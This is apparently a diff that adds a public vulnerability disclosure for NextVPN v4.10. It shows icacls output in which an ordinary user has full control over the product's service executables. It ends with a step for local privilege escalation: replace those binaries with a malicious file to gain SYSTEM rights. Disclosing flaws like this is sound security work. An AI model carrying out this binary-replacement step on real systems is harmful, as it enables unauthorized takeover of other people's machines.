@@ -1,0 +1,68 @@
+# Exploit Title: NextVPN v4.10 - Insecure File Permissions 
+# Date: 2019-12-23 
+# Exploit Author: SajjadBnd 
+# Contact: blackwolf@post.com 
+# Vendor Homepage: https://vm3max.site 
+# Software Link:http://dl.spacevm.com/NextVPNSetup-v4.10.exe 
+# Version: 4.10 
+# Tested on: Win10 Professional x64 
+
+[ Description ] 
+
+The NextVPN Application was installed with insecure file permissions. It was found that all folder and file permissions were incorrectly configured during installation. It was possible to replace the service binary. 
+
+[ PoC ]
+
+C:\Users\user\AppData\Local\NextVPN>icacls *.exe
+
+Helper64.exe NT AUTHORITY\SYSTEM:(F)
+             BUILTIN\Administrators:(F)
+             DESKTOP-5V14SL6\user:(F)
+ 
+NextVPN.exe NT AUTHORITY\SYSTEM:(F)
+            BUILTIN\Administrators:(F)
+            DESKTOP-5V14SL6\user:(F)
+ 
+Proxifier.exe NT AUTHORITY\SYSTEM:(F)
+              BUILTIN\Administrators:(F)
+              DESKTOP-5V14SL6\user:(F)
+ 
+ProxyChecker.exe NT AUTHORITY\SYSTEM:(F)
+                 BUILTIN\Administrators:(F)
+                 DESKTOP-5V14SL6\user:(F)
+ 
+Uninstall.exe NT AUTHORITY\SYSTEM:(F)
+              BUILTIN\Administrators:(F)
+              DESKTOP-5V14SL6\user:(F)
+ 
+Successfully processed 5 files; Failed processing 0 files
+and other Directories :
+
+>cd openconnect
+openconnect.exe NT AUTHORITY\SYSTEM:(F)
+                BUILTIN\Administrators:(F)
+                DESKTOP-5V14SL6\user:(F)
+Successfully processed 1 files; Failed processing 0 files
+ 
+ 
+>cd st
+ 
+st.exe NT AUTHORITY\SYSTEM:(F)
+       BUILTIN\Administrators:(F)
+       DESKTOP-5V14SL6\user:(F)
+Successfully processed 1 files; Failed processing 0 files
+ 
+>cd update
+
+update.exe NT AUTHORITY\SYSTEM:(F)
+           BUILTIN\Administrators:(F)
+           DESKTOP-5V14SL6\user:(F)
+
+Successfully processed 1 files; Failed processing 0 files
+
+[ Exploit -Privilege Escalation  ]
+
+ReplaceNextVPN.exe,update.exe,st.exe,openconnect.exe,Helper64.exe and other ... with any executable
+malicious  file you want then wait and get SYSTEM or Administrator rights (Privilege Escalation)
+
+ 
